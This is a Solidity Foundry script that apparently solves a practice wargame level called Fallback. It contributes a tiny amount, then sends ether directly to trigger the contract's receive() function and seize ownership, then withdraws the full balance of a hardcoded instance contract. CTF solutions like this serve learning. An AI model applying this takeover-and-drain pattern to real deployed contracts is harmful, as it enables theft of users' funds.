// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/L1Fallback.sol";

contract L1FallbackAttack is Script {
    // Your instance address
    Fallback fallBack = Fallback(payable(0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // Contribute amount lesser than 0.001 ether
        fallBack.contribute{value: 0.0001 ether}();
        // Transfer eth into the contract to trigger receive() function
        (bool success,) = address(fallBack).call{value: 1 ether}("");
        require(success, "Transfer failed");

        console.log("New owner:", fallBack.owner());
        fallBack.withdraw();
        console.log("Contract balance after withdrawal:", address(fallBack).balance / 1e18);
        vm.stopBroadcast();
    }
}
